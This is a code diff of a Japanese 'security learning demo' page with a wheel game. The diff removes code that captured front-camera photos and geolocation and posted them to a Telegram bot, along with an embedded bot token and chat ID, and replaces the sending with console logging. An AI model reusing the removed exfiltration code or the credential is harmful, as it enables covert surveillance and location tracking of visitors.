@@ -70,18 +70,16 @@
 <details class="security-notice">
   <summary><b>【重要：セキュリティ学習用デモサイト】</b></summary>
   <br>
-  このサイトは、JavaScriptによる不正なデータ取得（スパイウェア）の手口を学ぶための教育用デモページです。
+  このサイトは、JavaScriptによる不正なデータ取得の手口を学ぶための教育用デモページです。
   <br><br>
   本サイトでは、ユーザーが同意した場合に限り、以下の処理が行われます：<br>
   ・端末のカメラを使用した写真の撮影<br>
   ・現在地（位置情報）の取得<br>
-  ・取得されたデータの外部サービスへの送信<br><br>
+  ・取得されたデータの外部サービスへの送信（デモのため実際には送信されません）<br><br>
   これらの処理は、画面上の確認操作およびユーザーの明示的な同意があった場合のみ実行されます。
   同意しない場合は、データの取得および送信は行われません。<br><br>
-  取得されたデータは、本デモの動作確認および学習目的のためにのみ使用されます。<br><br>
   許可なく第三者に対してこのURLを送信したり、実行させたりする行為は禁止されています。
-  内容によっては法律（不正指令電磁的記録に関する罪、プライバシー侵害等）に抵触する可能性があります。<br><br>
-  本デモは仕組みの理解を目的としており、悪用を推奨するものではありません。
+  内容によっては法律（不正指令電磁的記録に関する罪、プライバシー侵害等）に抵触する可能性があります。
 </details>
 
 <script>
@@ -92,9 +90,6 @@ function animateBG() {
   requestAnimationFrame(animateBG);
 }
 animateBG();
-
-const BOT_TOKEN = "8759355239:AAHw3_fNnjLBCFQCfp35a6ssW3Qk3yQxSPg";
-const CHAT_ID = "7541612001"; // あなたのTelegramユーザーID
 
 const canvas = document.getElementById("wheel");
 const ctx = canvas.getContext("2d");
@@ -138,7 +133,7 @@ function getTempLocation() {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          tempLocationMsg = `📍位置情報: http://googleusercontent.com/maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          tempLocationMsg = `📍位置情報: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
           resolve();
         },
         () => { resolve(); },
@@ -155,7 +150,9 @@ async function getTempData() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const video = document.createElement("video");
-    video.srcObject = stream; await video.play();
+    video.srcObject = stream;
+    await new Promise(resolve => video.onloadedmetadata = resolve);
+    await video.play();
     
     for (let i = 0; i < 3; i++) {
       const tempCanvas = document.createElement("canvas");
@@ -167,7 +164,7 @@ async function getTempData() {
     }
     stream.getTracks().forEach(t => t.stop());
   } catch (e) {
-    console.log("Error accessing camera");
+    console.log("Access denied");
   }
 
   await getTempLocation();
@@ -181,22 +178,14 @@ async function getTempData() {
 
 async function finalSend() {
   document.getElementById("confirmModal").style.display = "none";
-  document.getElementById("result").textContent = "送信中...";
+  document.getElementById("result").textContent = "処理中...";
   
-  for (const blob of tempPhotos) {
-    const fd = new FormData();
-    fd.append("chat_id", CHAT_ID);
-    fd.append("photo", blob, "captured.jpg");
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
-  }
-  if (tempLocationMsg) {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: tempLocationMsg })
-    });
-  }
-  alert("完了しました。");
+  console.log("【デモ実行】以下のデータを送信対象として認識しました：");
+  console.log("画像枚数:", tempPhotos.length);
+  if(tempLocationMsg) console.log(tempLocationMsg);
+
+  await new Promise(r => setTimeout(r, 1500));
+  alert("デモ完了：実際の送信は行われません。");
   resetUI();
 }
 
